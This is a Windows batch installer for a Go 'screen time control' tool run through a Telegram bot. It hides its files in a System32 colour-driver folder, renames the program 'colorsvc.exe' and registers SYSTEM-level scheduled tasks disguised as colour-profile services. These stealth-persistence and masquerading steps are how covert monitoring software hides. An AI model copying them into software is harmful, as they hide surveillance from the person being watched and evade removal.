@echo off
echo ================================
echo Screen Time Control MVP
echo ================================
echo.

REM Check administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Administrator privileges required!
    echo Run this file as administrator.
    pause
    exit /b 1
)

REM Check Go installation
where go >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Go is not installed!
    echo Download from https://golang.org/dl/
    pause
    exit /b 1
)

echo [1/6] Compiling application...
go build -ldflags="-H windowsgui" -o screentime.exe .
if %errorLevel% neq 0 (
    echo Compilation error!
    pause
    exit /b 1
)
echo Compilation successful!
echo.

REM Hidden installation directory in system folder
set INSTALL_DIR=%SystemRoot%\System32\spool\drivers\color\cache
echo [2/6] Creating hidden directory...
mkdir "%INSTALL_DIR%" 2>nul
attrib +h "%INSTALL_DIR%"

REM Configure settings
echo [3/6] Configuration setup
echo.
set /p BOT_TOKEN="Enter Telegram Bot Token: "
set /p ADMIN_ID="Enter Telegram Admin ID (numeric): "
set /p USERNAME="Enter Windows Username to monitor: "
set /p LIMIT="Daily limit in minutes (default 180): "
if "%LIMIT%"=="" set LIMIT=180

echo.
echo Updating configuration...

REM Update config via PowerShell
powershell -Command "(gc 'config.yaml') -replace 'YOUR_BOT_TOKEN', '%BOT_TOKEN%' | Out-File -encoding ASCII 'config.yaml'"
powershell -Command "(gc 'config.yaml') -replace '123456789', '%ADMIN_ID%' | Out-File -encoding ASCII 'config.yaml'"
powershell -Command "(gc 'config.yaml') -replace 'TargetUser', '%USERNAME%' | Out-File -encoding ASCII 'config.yaml'"
powershell -Command "(gc 'config.yaml') -replace 'daily_minutes: 180', 'daily_minutes: %LIMIT%' | Out-File -encoding ASCII 'config.yaml'"

echo Configuration updated!
echo.

REM Copy files
echo [4/6] Copying files...
copy screentime.exe "%INSTALL_DIR%\colorsvc.exe" /Y >nul
copy config.yaml "%INSTALL_DIR%\config.dat" /Y >nul
attrib +h "%INSTALL_DIR%\colorsvc.exe"
attrib +h "%INSTALL_DIR%\config.dat"
echo Files copied!
echo.

REM Create Task Scheduler task for monitoring (every minute)
echo [5/6] Creating monitoring task...
schtasks /create /tn "ColorProfileSync" /tr "%INSTALL_DIR%\colorsvc.exe --monitor" /sc minute /mo 1 /ru SYSTEM /rl HIGHEST /f >nul
if %errorLevel% neq 0 (
    echo Error creating monitoring task!
    pause
    exit /b 1
)

REM Create task for Telegram bot (run at system startup)
echo [6/6] Creating Telegram bot task...
schtasks /create /tn "ColorProfileService" /tr "%INSTALL_DIR%\colorsvc.exe --bot" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul
if %errorLevel% neq 0 (
    echo Error creating bot task!
    pause
    exit /b 1
)

REM Start bot immediately
echo Starting Telegram bot...
start /b "" "%INSTALL_DIR%\colorsvc.exe" --bot

echo.
echo ================================
echo Installation completed successfully!
echo ================================
echo.
echo Tasks created:
echo - ColorProfileSync (monitoring every minute)
echo - ColorProfileService (Telegram bot)
echo.
echo User: %USERNAME%
echo Daily limit: %LIMIT% minutes
echo.
echo Telegram bot started.
echo Control via Telegram.
echo.
echo IMPORTANT: Save path for uninstallation:
echo %INSTALL_DIR%
echo.
pause
